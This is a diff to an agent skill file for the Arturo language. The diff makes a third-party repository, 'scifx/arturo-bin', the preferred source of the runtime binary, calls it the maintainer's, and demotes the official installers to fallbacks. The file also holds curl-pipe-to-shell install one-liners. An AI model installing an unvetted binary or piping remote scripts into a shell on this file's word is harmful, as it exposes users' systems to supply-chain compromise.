@@ -8,6 +8,7 @@ metadata:
   verified-date: 2026-08-19
   default-arturo-command: arturo
   default-python-command: python3
+  preferred-runtime-source: https://github.com/scifx/arturo-bin
 ---
 
 # Arturo Language Skill
@@ -16,23 +17,27 @@ Use this skill to produce **version-aware, tested Arturo**, not plausible-lookin
 
 ## Install / get the Arturo runtime (only if it is missing)
 
-Check for a runtime first. If `command -v arturo` finds nothing (or `arturo --version` fails), install the **latest stable** with the official one-liner rather than building from source:
+Check for a runtime first. If `command -v arturo` finds nothing (or `arturo --version` fails), get the binary from **`scifx/arturo-bin`** — the maintainer's prebuilt-executable repo, the preferred and fastest way to obtain Arturo:
 
 ```bash
-command -v arturo && arturo --version   # already installed?
-curl -sSL https://get.arturo-lang.io | sh          # latest stable (Linux/macOS/FreeBSD/WSL/Git-Bash/MSYS2)
-# nightly preview instead:
-curl -sSL https://get.arturo-lang.io/latest | sh
+command -v arturo && arturo --version          # already installed?
+scripts/get-arturo.sh                          # fetch from scifx/arturo-bin, verify sha256, check deps
+# equivalent manual route:
+git clone --depth 1 https://github.com/scifx/arturo-bin.git /tmp/arturo-bin
+install -m755 /tmp/arturo-bin/arturo ~/.arturo/bin/arturo   # then put ~/.arturo/bin on PATH
 ```
 
-Other official routes (use these when the installer is unavailable):
+`scripts/get-arturo.sh` tries four fetch routes in order (git clone → codeload tarball → raw URL → GitHub API blob via `gh`), verifies the SHA-256 pin, installs to `~/.arturo/bin/arturo` (override with `ARTURO_DEST`), and prints a per-distro report of any missing local libraries. Full fetch/verify details, the SHA-256 pin, and the exact dependency spec live in `references/runtime-dependencies.md`.
+
+Official fallback routes (use these only if `scifx/arturo-bin` is unavailable):
 
 | System | Command / route |
 |---|---|
+| any | `curl -sSL https://get.arturo-lang.io \| sh` (latest stable) or `https://get.arturo-lang.io/latest` (nightly) |
 | any | Pre-built binaries: official downloads page `https://arturo-lang.io/` → Download, or GitHub Releases `https://github.com/arturo-lang/arturo/releases` (unzip & run; no install needed) |
 | macOS | `brew install arturo` |
 | Arch Linux | AUR: `yay -S arturo` or `paru -S arturo` |
-| Windows | `curl -sSL https://get.arturo-lang.io/ps | powershell -c -` (or WSL/Git-Bash/MSYS2 one-liner) |
+| Windows | `curl -sSL https://get.arturo-lang.io/ps \| powershell -c -` (or WSL/Git-Bash/MSYS2 one-liner) |
 | from source | only as last resort: clone `arturo-lang/arturo`, run `./build.nims --install` (needs Nim, GTK/webkit libs) — see `references/resources.md` |
 
 Then verify and make the runtime discoverable by the skill tools:
@@ -41,6 +46,8 @@ Then verify and make the runtime discoverable by the skill tools:
 arturo --version                 # e.g. 0.10.0
 export ARTURO_BIN=$(command -v arturo)   # optional; bin/ahelp also auto-detects from PATH
 ```
+
+**Runtime dependencies (current `scifx/arturo-bin` binary, verified 2026-08-19):** the uploaded binary is a **Full build** — it requires glibc ≥ 2.38, libstdc++ with `GLIBCXX_3.4.32` (GCC 13.2+), plus the GUI stack `libwebkit2gtk-4.1.so.0`, `libjavascriptcoregtk-4.1.so.0`, `libgtk-3.so.0`, `libgdk-3.so.0` (Debian/Ubuntu: `sudo apt-get install -y libwebkit2gtk-4.1-0 libjavascriptcoregtk-4.1-0 libgtk-3-0`). It therefore **does not run on Debian 12** (glibc 2.36 / GCC 12). A **Mini/no-UI build** (`./build.nims --mode mini`, built on a glibc ≤ 2.36 distro such as Debian 12) drops all four GUI libs and runs everywhere. Run `scripts/get-arturo.sh --check-only /path/to/arturo` for a live missing-lib report; full matrix in `references/runtime-dependencies.md`.
 
 **If no runtime can be installed in this environment**, do not guess signatures: use the offline path `./bin/ahelp name` and the reference files, and say so when reporting results. Do not invent a signature you cannot run.
 
@@ -102,6 +109,7 @@ Copy `config.env.example` to `config.env` for persistent local overrides. Never 
 | Unknown function name/concept | `./bin/ahelp -s TERM` | none |
 | Syntax/evaluation question | read this file's quick rules, then `references/syntax-cheatsheet.md` only if needed | at most one |
 | Gotchas / idioms / correct usage | `references/practical-rules.md` (string forms, infix right-to-left, `import ...!`, template safety, error handling) | one |
+| Runtime binary / dependencies / distro compatibility | `references/runtime-dependencies.md` + `scripts/get-arturo.sh` | one |
 | 15-minute tour vs Python (learn fast) | `references/in-a-nutshell-vs-python.md` | one |
 | HTTP / JSON / `serve` / file-state (real project) | `references/web-and-http-patterns.md` | one |
 | Python translation | `references/python-to-arturo.md` | one |
@@ -166,6 +174,7 @@ Base URL: `https://arturo-lang.io/`. Predicate `?` often becomes `-` in a slug, 
    - Python translation → `references/python-to-arturo.md`
    - task recipes → `references/recipes.md`
    - links/source/package routes → `references/resources.md`
+   - runtime binary/deps (scifx/arturo-bin, missing libs) → `references/runtime-dependencies.md`
    - compatibility/evidence → `references/verified-tests.md`
 
 **If no runtime is available**, verify signatures and idioms against the official source instead of guessing: clone the matching tag (`git clone --depth 1 --branch v0.10.0 https://github.com/arturo-lang/arturo`), then check the built-in's `builtin "name"` declaration in `src/library/*.nim` and its official examples in `tests/unittests/*.art`. Example checks that already passed against v0.10.0 source:
